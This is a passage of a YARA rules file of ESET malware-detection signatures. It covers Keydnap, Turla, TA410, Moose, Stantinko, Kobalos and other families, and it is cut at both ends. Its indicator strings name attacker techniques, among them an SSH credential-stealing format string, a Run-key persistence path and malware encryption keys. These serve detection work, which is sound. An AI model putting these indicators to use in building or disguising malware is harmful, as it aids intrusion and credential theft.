		$ = "PsmIsANiceM0du1eWith0SugarInsideA"
		$ = "destroyPSM"
		$ = "FM_PENDING_DOWN_%X"
		$ = "%s was canceled after %d try (reached MaxTry parameter)"
		$ = "you forgot value name"
		$ = "wakeup successfully scheduled in %d minutes"
		$ = "BD started at %s"
		$ = "decyphering failed on bd"

	condition:
		any of them
}

rule ESET_Keydnap_Downloader
{
	meta:
		description = "OSX/Keydnap Downloader"
		author = "Marc-Etienne M.Léveillé"
		id = "2b21007a-b143-5538-8777-ba35448d00aa"
		date = "2016-07-06"
		modified = "2016-07-06"
		reference = "http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-is-hungry-for-credentials"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/keydnap/keydnap.yar#L33-L49"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "71c8885193a92fa9c71055c37e629a54d50070cf6820b9216a824ecc4db2ce3c"
		score = 75
		quality = 80
		tags = ""
		version = "1"

	strings:
		$ = "icloudsyncd"
		$ = "killall Terminal"
		$ = "open %s"

	condition:
		2 of them
}

rule ESET_Keydnap_Backdoor_Packer
{
	meta:
		description = "OSX/Keydnap packed backdoor"
		author = "Marc-Etienne M.Léveillé"
		id = "f29ad5af-bc86-5764-9451-5a8363788c4e"
		date = "2016-07-06"
		modified = "2016-07-06"
		reference = "http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-is-hungry-for-credentials"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/keydnap/keydnap.yar#L51-L67"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "b1740bf38376be81d3b42306c2ce81f578c0b5c9db804f063836bf98f57ed147"
		score = 75
		quality = 80
		tags = ""
		version = "1"

	strings:
		$upx_string = "This file is packed with the UPX"
		$packer_magic = "ASS7"
		$upx_magic = "UPX!"

	condition:
		$upx_string and $packer_magic and not $upx_magic
}

rule ESET_Keydnap_Backdoor
{
	meta:
		description = "Unpacked OSX/Keydnap backdoor"
		author = "Marc-Etienne M.Léveillé"
		id = "099c1796-6237-5ec1-ba25-cd5feca79865"
		date = "2016-07-06"
		modified = "2016-07-06"
		reference = "http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-is-hungry-for-credentials"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/keydnap/keydnap.yar#L69-L86"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "fa209577a562ef9088d3ad3df3fbc0edda96f09d19177842f0ddea42c658f530"
		score = 75
		quality = 80
		tags = ""
		version = "1"

	strings:
		$ = "api/osx/get_task"
		$ = "api/osx/cmd_executed"
		$ = "Loader-"
		$ = "u2RLhh+!LGd9p8!ZtuKcN"
		$ = "com.apple.iCloud.sync.daemon"

	condition:
		2 of them
}

rule ESET_Apt_Windows_Invisimole_Wrapper_DLL
{
	meta:
		description = "Detects InvisiMole wrapper DLL with embedded RC2CL and RC2FM backdoors, by export and resource names"
		author = "ESET Research"
		id = "b9609b09-3ef5-5793-a3aa-4692cec367d9"
		date = "2021-05-17"
		modified = "2021-05-17"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/invisimole/invisimole.yar#L120-L138"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "156bc5bc7b0ed5c77a5a15e7799a3077d40150896476a60935cf21a9afe36856"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	condition:
		pe.exports( "GetDataLength" ) and for any y in ( 0 .. pe.number_of_resources - 1 ) : ( pe.resources [ y ] . type == pe.RESOURCE_TYPE_RCDATA and pe.resources [ y ] . name_string == "R\x00C\x002\x00C\x00L\x00" ) and for any y in ( 0 .. pe.number_of_resources - 1 ) : ( pe.resources [ y ] . type == pe.RESOURCE_TYPE_RCDATA and pe.resources [ y ] . name_string == "R\x00C\x002\x00F\x00M\x00" )
}

rule ESET_Carbon_Metadata
{
	meta:
		description = "Turla Carbon malware"
		author = "ESET Research"
		id = "976b6a7d-00bf-5d0f-baf9-84fc5dbd21a2"
		date = "2017-03-30"
		modified = "2017-03-30"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/turla/carbon.yar#L53-L69"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "81b59e9566f3b3356acf12dadb80abdcbee28e0b1a9efead66fcb95bf6fc1aa5"
		score = 75
		quality = 80
		tags = ""
		contact = "github@eset.com"
		license = "BSD 2-Clause"

	condition:
		(pe.version_info [ "InternalName" ] contains "SERVICE.EXE" or pe.version_info [ "InternalName" ] contains "MSIMGHLP.DLL" or pe.version_info [ "InternalName" ] contains "MSXIML.DLL" ) and pe.version_info [ "CompanyName" ] contains "Microsoft Corporation"
}

rule ESET_Turla_Outlook_Gen
{
	meta:
		description = "Turla Outlook malware"
		author = "ESET Research"
		id = "efef2443-c941-54c2-abfa-bbe29c53d930"
		date = "2018-05-09"
		modified = "2018-09-05"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/turla/turla-outlook.yar#L42-L74"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "f709e517e9d957775601670c426cc9def1c4104cb1ff647d269800d2af4372c7"
		score = 75
		quality = 78
		tags = ""
		version = 2
		contact = "github@eset.com"
		license = "BSD 2-Clause"

	strings:
		$s1 = "Outlook Express" ascii wide
		$s2 = "Outlook watchdog" ascii wide
		$s3 = "Software\\RIT\\The Bat!" ascii wide
		$s4 = "Mail Event Window" ascii wide
		$s5 = "Software\\Mozilla\\Mozilla Thunderbird\\Profiles" ascii wide
		$s6 = "%%PDF-1.4\n%%%c%c\n" ascii wide
		$s7 = "%Y-%m-%dT%H:%M:%S+0000" ascii wide
		$s8 = "rctrl_renwnd32" ascii wide
		$s9 = "NetUIHWND" ascii wide
		$s10 = "homePostalAddress" ascii wide
		$s11 = "/EXPORT;OVERRIDE;START=-%d;END=-%d;FOLDER=%s;OUT=" ascii wide
		$s12 = "Re:|FWD:|AW:|FYI:|NT|QUE:" ascii wide
		$s13 = "IPM.Note" ascii wide
		$s14 = "MAPILogonEx" ascii wide
		$s15 = "pipe\\The Bat! %d CmdLine" ascii wide
		$s16 = "PowerShellRunner.dll" ascii wide
		$s17 = "cmd container" ascii wide
		$s18 = "mapid.tlb" ascii wide nocase
		$s19 = "Content-Type: F)*+" ascii wide fullword

	condition:
		ESET_Not_Ms_PRIVATE and 5 of them
}

rule ESET_Turla_Outlook_Filenames
{
	meta:
		description = "Turla Outlook filenames"
		author = "ESET Research"
		id = "3a08003d-50d6-5fdf-9f74-222335ebfa3e"
		date = "2018-08-22"
		modified = "2018-09-05"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/turla/turla-outlook.yar#L76-L91"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "3be86c9325de6634c032321beed131fdf1e1952afcb43258fb202d0097610501"
		score = 75
		quality = 80
		tags = ""
		contact = "github@eset.com"
		license = "BSD 2-Clause"

	strings:
		$s1 = "mapid.tlb"
		$s2 = "msmime.dll"
		$s3 = "scawrdot.db"

	condition:
		any of them
}

rule ESET_Turla_Outlook_Log
{
	meta:
		description = "First bytes of the encrypted Turla Outlook logs"
		author = "ESET Research"
		id = "b0031c08-8418-5a02-8a2c-daa7236f46f0"
		date = "2018-08-22"
		modified = "2018-09-05"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/turla/turla-outlook.yar#L93-L107"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "e7dc00c33a643c0940aaea2096d099192b27df3c81c518f1dc2b3d45a0a74312"
		score = 75
		quality = 80
		tags = ""
		contact = "github@eset.com"
		license = "BSD 2-Clause"

	strings:
		$s1 = {01 87 C9 75 C8 69 98 AC E0 C9 7B [21] EB BB 60 BB 5A}

	condition:
		$s1 at 0
}

rule ESET_Turla_Outlook_Exports
{
	meta:
		description = "Export names of Turla Outlook Malware"
		author = "ESET Research"
		id = "6df4f75e-711a-539d-94bf-9e4e2063ecd4"
		date = "2018-08-22"
		modified = "2018-09-05"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/turla/turla-outlook.yar#L109-L125"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "a961fdb43ea1e99b308f55b8f5e264b1f3fa817eaf463d512e2ad8b98a18ee99"
		score = 75
		quality = 80
		tags = ""
		contact = "github@eset.com"
		license = "BSD 2-Clause"

	condition:
		(pe.exports ( "install" ) or pe.exports ( "Install" ) ) and pe.exports ( "TBP_Initialize" ) and pe.exports ( "TBP_Finalize" ) and pe.exports ( "TBP_GetName" ) and pe.exports ( "DllRegisterServer" ) and pe.exports ( "DllGetClassObject" )
}

rule ESET_Gazer_Certificate_Subject
{
	meta:
		description = "Turla Gazer malware"
		author = "ESET Research"
		id = "a7719333-b341-538c-a8ed-5c50b653a765"
		date = "2017-08-30"
		modified = "2017-08-29"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/turla/gazer.yar#L33-L46"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "6e870c9cdcee33769162de62ea143ff401af50b22a63d2f212c44d06f5771dec"
		score = 75
		quality = 80
		tags = ""
		contact = "github@eset.com"
		license = "BSD 2-Clause"

	condition:
		for any i in ( 0 .. pe.number_of_signatures - 1 ) : ( pe.signatures [ i ] . subject contains "Solid Loop" or pe.signatures [ i ] . subject contains "Ultimate Computer Support" )
}

rule ESET_Apt_Windows_TA410_Tendyron_Dropper
{
	meta:
		description = "TA410 Tendyron Dropper"
		author = "ESET Research"
		id = "8d1e16d9-b5c2-5427-a0b4-7dd00a9df5ec"
		date = "2020-12-09"
		modified = "2022-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/ta410/ta410.yar#L34-L53"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "45f7300a4b85624ad3fda5c73a24f53f53cb7990def4d84e04dcd8e5747f4f2e"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "Global\\{F473B3BE-08EE-4710-A727-9E248F804F4A}" wide
		$s2 = "Global\\8D32CCB321B2" wide
		$s3 = "Global\\E4FE94F75490" wide
		$s4 = "Program Files (x86)\\Internet Explorer\\iexplore.exe" wide
		$s5 = "\\RPC Control\\OLE" wide
		$s6 = "ALPC Port" wide

	condition:
		int16 ( 0 ) == 0x5A4D and 4 of them
}

rule ESET_Apt_Windows_TA410_Tendyron_Installer
{
	meta:
		description = "TA410 Tendyron Installer"
		author = "ESET Research"
		id = "95ccad1c-99fb-5d38-aec0-650db3e06b35"
		date = "2020-12-09"
		modified = "2022-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/ta410/ta410.yar#L55-L73"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "9c3afb924747614f27c31cf2c3d98f4932a9d11597a3ac94263bf93be02801da"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "Tendyron" wide
		$s2 = "OnKeyToken_KEB.dll" wide
		$s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" wide
		$s4 = "Global\\8D32CCB321B2"
		$s5 = "\\RTFExploit\\"

	condition:
		int16 ( 0 ) == 0x5A4D and 3 of them
}

rule ESET_Apt_Windows_TA410_Tendyron_Downloader
{
	meta:
		description = "TA410 Tendyron Downloader"
		author = "ESET Research"
		id = "afd8a2a7-8d58-5a96-b9e0-6f8b859e83c5"
		date = "2020-12-09"
		modified = "2022-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/ta410/ta410.yar#L75-L107"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "16030a78ae9af8783f5913644294ceff861c8264ead8ca99435032be6d7949ef"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$chunk_1 = {
            8A 10
            80 F2 5C
            80 C2 5C
            88 10
            40
            83 E9 01
            75 ??
        }
		$s1 = "startModule" fullword

	condition:
		int16 ( 0 ) == 0x5A4D and all of them
}

rule ESET_Apt_Windows_TA410_X4_Strings
{
	meta:
		description = "Matches various strings found in TA410 X4"
		author = "ESET Research"
		id = "e6af4516-8b79-5182-8571-7dd530632ddc"
		date = "2020-10-09"
		modified = "2022-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/ta410/ta410.yar#L109-L125"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "d4b2321a6d0eb0ca8d7c47596af2a45c22b3aef15d1832d64d6588a62cab312a"
		score = 75
		quality = 74
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "[X]InLoadSC" ascii wide nocase
		$s3 = "MachineKeys\\Log\\rsa.txt" ascii wide nocase
		$s4 = "MachineKeys\\Log\\output.log" ascii wide nocase

	condition:
		any of them
}

rule ESET_Moose_1
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "4d228de6-ddbf-57c0-a330-5840c4d40dfc"
		date = "2015-04-21"
		modified = "2016-11-01"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/moose/linux-moose.yar#L41-L76"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "8bedac80a1f754ce56294ba9786b62a002aacd074f756724401efc61def127e6"
		score = 75
		quality = 30
		tags = ""
		Author = "Thomas Dupuy"
		Description = "Linux/Moose malware"
		Contact = "github@eset.com"
		License = "BSD 2-Clause"

	strings:
		$s0 = "Status: OK"
		$s1 = "--scrypt"
		$s2 = "stratum+tcp://"
		$s3 = "cmd.so"
		$s4 = "/Challenge"
		$s7 = "processor"
		$s9 = "cpu model"
		$s21 = "password is wrong"
		$s22 = "password:"
		$s23 = "uthentication failed"
		$s24 = "sh"
		$s25 = "ps"
		$s26 = "echo -n -e "
		$s27 = "chmod"
		$s28 = "elan2"
		$s29 = "elan3"
		$s30 = "chmod: not found"
		$s31 = "cat /proc/cpuinfo"
		$s32 = "/proc/%s/cmdline"
		$s33 = "kill %s"

	condition:
		ESET_Is_Elf_PRIVATE and all of them
}

rule ESET_Moose_2
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "74372984-dace-5665-a5d0-39b8d1002fa1"
		date = "2016-10-02"
		modified = "2016-11-01"
		reference = "http://www.welivesecurity.com/2016/11/02/linuxmoose-still-breathing/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/moose/linux-moose.yar#L78-L110"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "3f50d2d81d4c27e44d93804adcf93971017767ed0e020447cdb343931c2fbc43"
		score = 75
		quality = 80
		tags = ""
		Author = "Thomas Dupuy"
		Description = "Linux/Moose malware active since September 2015"
		Contact = "github@eset.com"
		License = "BSD 2-Clause"

	strings:
		$s1 = "Modules are loaded"
		$s2 = "--scrypt"
		$s3 = "http://"
		$s4 = "https://"
		$s5 = "processor "
		$s6 = "cpu model "
		$s7 = "Host: www.challpok.cn"
		$s8 = "Cookie: PHPSESSID=%s; nhash=%s; chash=%s"
		$s9 = "fail!"
		$s10 = "H3lL0WoRlD"
		$s11 = "crondd"
		$s12 = "cat /proc/cpuinfo"
		$s13 = "Set-Cookie: PHPSESSID="
		$s14 = "Set-Cookie: LP="
		$s15 = "Set-Cookie: WL="
		$s16 = "Set-Cookie: CP="
		$s17 = "Loading modules..."
		$s18 = "-nobg"

	condition:
		ESET_Is_Elf_PRIVATE and 5 of them
}

rule ESET_Beds_Plugin
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "7c038e92-1064-503e-9d63-2d2c10f1759e"
		date = "2017-07-17"
		modified = "2017-07-20"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/stantinko/stantinko.yar#L34-L51"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "024cb91288f133e4cdf5993ac0477de6de76d38fa06f7affa348c6a28a4600da"
		score = 75
		quality = 80
		tags = ""
		Author = "Frédéric Vachon"
		Description = "Stantinko BEDS' plugins"
		Contact = "github@eset.com"
		License = "BSD 2-Clause"

	condition:
		pe.exports( "CheckDLLStatus" ) and pe.exports ( "GetPluginData" ) and pe.exports ( "InitializePlugin" ) and pe.exports ( "IsReleased" ) and pe.exports ( "ReleaseDLL" )
}

rule ESET_Beds_Dropper
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "47ccab59-253f-55d4-b38a-4441802626fc"
		date = "2017-07-17"
		modified = "2017-07-20"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/stantinko/stantinko.yar#L53-L67"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "4b5d121e182e3fddd766a7a1227c5de273995e9336156e7a6e8a17faad681bea"
		score = 75
		quality = 80
		tags = ""
		Author = "Frédéric Vachon"
		Description = "BEDS dropper"
		Contact = "github@eset.com"
		License = "BSD 2-Clause"

	condition:
		pe.imphash( ) == "a7ead4ef90d9981e25728e824a1ba3ef"
}

rule ESET_Stantinko_Pdb
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "24694e53-b89e-5cd3-ad53-e738bbd7d69d"
		date = "2017-07-17"
		modified = "2017-07-20"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/stantinko/stantinko.yar#L132-L148"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "902c0ee086ce1a8def831d2f30c868165198c6c304faac3a93116a524f8e2fbf"
		score = 75
		quality = 80
		tags = ""
		Author = "Frédéric Vachon"
		Description = "Stantinko malware family PDB path"
		Contact = "github@eset.com"
		License = "BSD 2-Clause"

	strings:
		$s1 = "D:\\work\\service\\service\\" ascii

	condition:
		all of them
}

rule ESET_Stantinko_D3D
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "6652e55c-96a0-55a7-9941-7f32bbf984e5"
		date = "2017-07-17"
		modified = "2017-07-20"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/stantinko/stantinko.yar#L172-L187"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "4e8da3f11df15e4aa469db62961ae390c4c4df2a5335eec0bdab19b14cc8343d"
		score = 75
		quality = 80
		tags = ""
		Author = "Marc-Etienne M.Léveillé"
		Description = "Stantinko d3dadapter component"
		Contact = "github@eset.com"
		License = "BSD 2-Clause"

	condition:
		pe.exports( "EntryPoint" ) and pe.exports ( "ServiceMain" ) and pe.imports ( "WININET.DLL" , "HttpAddRequestHeadersA" )
}

rule ESET_Stantinko_Ihctrl32
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "e8ab9f78-f438-5d9b-8407-e6c7e241da2c"
		date = "2017-07-17"
		modified = "2017-07-20"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/stantinko/stantinko.yar#L189-L209"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "1829e08fb2289f738d0e75ad9977169e9a94379da764b1766f23fa47e8bc2543"
		score = 75
		quality = 80
		tags = ""
		Author = "Marc-Etienne M.Léveillé"
		Description = "Stantinko ihctrl32 component"
		Contact = "github@eset.com"
		License = "BSD 2-Clause"

	strings:
		$s1 = "ihctrl32.dll"
		$s2 = "win32_hlp"
		$s3 = "Ihctrl32Main"
		$s4 = "I%citi%c%size%s%c%ci%s"
		$s5 = "Global\\Intel_hctrl32"

	condition:
		2 of them
}

rule ESET_Stantinko_Wsaudio
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "623f4ac7-03ec-52df-b7bf-0a2055453c52"
		date = "2017-07-17"
		modified = "2017-07-20"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/stantinko/stantinko.yar#L211-L233"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "45d92f1475f316ba50a9a4a3dd519d1186ed16c68bd2debe326736a1e3154562"
		score = 75
		quality = 80
		tags = ""
		Author = "Marc-Etienne M.Léveillé"
		Description = "Stantinko wsaudio component"
		Contact = "github@eset.com"
		License = "BSD 2-Clause"

	strings:
		$s1 = "GetInterface"
		$s2 = "wsaudio.dll"
		$s3 = "Global\\Wsaudio_Initialize"
		$s4 = "SOFTWARE\\Classes\\%s.FieldListCtrl.1\\"

	condition:
		2 of them
}

rule ESET_Stantinko_Ghstore
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "ef9f0c27-35ea-5dd5-925f-09b6e043569d"
		date = "2017-07-17"
		modified = "2017-07-20"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/stantinko/stantinko.yar#L235-L255"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "e5628d6ffb2d3684264b3a88c4d7b5d2ce8983aa22badf5839ccb8ba2e3ef2d4"
		score = 75
		quality = 80
		tags = ""
		Author = "Marc-Etienne M.Léveillé"
		Description = "Stantinko ghstore component"
		Contact = "github@eset.com"
		License = "BSD 2-Clause"

	strings:
		$s1 = "G%cost%sSt%c%s%s%ce%sr" wide
		$s2 = "%cho%ct%sS%sa%c%s%crve%c" wide
		$s3 = "Par%c%ce%c%c%s" wide
		$s4 = "S%c%curity%c%s%c%s" wide
		$s5 = "Sys%c%s%c%c%su%c%s%clS%c%s%serv%s%ces" wide

	condition:
		3 of them
}

rule ESET_Kobalos
{
	meta:
		description = "Kobalos malware"
		author = "Marc-Etienne M.Léveillé"
		id = "cdffbe3d-c19d-53a8-9051-48affae00c8a"
		date = "2020-11-02"
		modified = "2021-02-01"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/kobalos/kobalos.yar#L32-L56"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "9161d22f9fbb1700dc3121e32104240e34512cb280aaf950aec61513f89061ef"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$encrypted_strings_sizes = {
            05 00 00 00 09 00 00 00  04 00 00 00 06 00 00 00
            08 00 00 00 08 00 00 00  02 00 00 00 02 00 00 00
            01 00 00 00 01 00 00 00  05 00 00 00 07 00 00 00
            05 00 00 00 05 00 00 00  05 00 00 00 0A 00 00 00
        }
		$password_md5_digest = { 3ADD48192654BD558A4A4CED9C255C4C }
		$rsa_512_mod_header = { 10 11 02 00 09 02 00 }
		$strings_rc4_key = { AE0E05090F3AC2B50B1BC6E91D2FE3CE }

	condition:
		any of them
}

rule ESET_Kobalos_Ssh_Credential_Stealer
{
	meta:
		description = "Kobalos SSH credential stealer seen in OpenSSH client"
		author = "Marc-Etienne M.Léveillé"
		id = "b1fc5163-de48-57fc-8ae7-1f2be6c64d8a"
		date = "2020-11-02"
		modified = "2021-02-01"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/kobalos/kobalos.yar#L58-L73"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "be238f5c2cc976a5638584a8c0fc580f2076735aadfe374e8d4162ba723bce10"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$ = "user: %.128s host: %.128s port %05d user: %.128s password: %.128s"

	condition:
		any of them
}

rule ESET_Prikormka
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "6073aa34-d385-5ae8-b97d-9b3d61015aae"
		date = "2016-05-10"
		modified = "2019-08-28"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/groundbait/prikormka.yar#L130-L141"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "f64195e680fbaefedba248aa15b37ed30ba72f42958cc48963a140165e951bff"
		score = 75
		quality = 80
		tags = ""
		Author = "Anton Cherepanov"
		Description = "Operation Groundbait"
		Contact = "threatintel@eset.com"
		License = "BSD 2-Clause"

	condition:
		ESET_Prikormkadropper_PRIVATE or ESET_Prikormkamodule_PRIVATE or ESET_Prikormkaearlyversion_PRIVATE
}

rule ESET_Linux_Rakos
{
	meta:
		description = "Linux/Rakos.A executable"
		author = "Peter Kálnai"
		id = "3c15401a-22c1-59e2-a979-1f9a6a990ae0"
		date = "2016-12-13"
		modified = "2016-12-19"
		reference = "http://www.welivesecurity.com/2016/12/20/new-linuxrakos-threat-devices-servers-ssh-scan/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/rakos/rakos.yar#L33-L53"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "79a02ada56bf75c5f178b58822eb905977cace3483453ea8cf4dfc32f6b6c30d"
		score = 75
		quality = 80
		tags = ""
		version = "1"
		contact = "threatintel@eset.com"
		license = "BSD 2-Clause"

	strings:
		$ = "upgrade/vars.yaml"
		$ = "MUTTER"
		$ = "/tmp/.javaxxx"
		$ = "uckmydi"

	condition:
		3 of them
}

rule ESET_Sparklinggoblin_Chacha20Loader_Richheader
{
	meta:
		description = "Rule matching ChaCha20 loaders rich header"
		author = "ESET Research"
		id = "e1dac369-f25e-5cb3-aafa-b0c45f05b295"
		date = "2021-03-30"
		modified = "2021-08-26"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/sparklinggoblin/SparklingGoblin.yar#L33-L57"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "09ffe37a54bc4ebebd8d56098e4c76232f35d821"
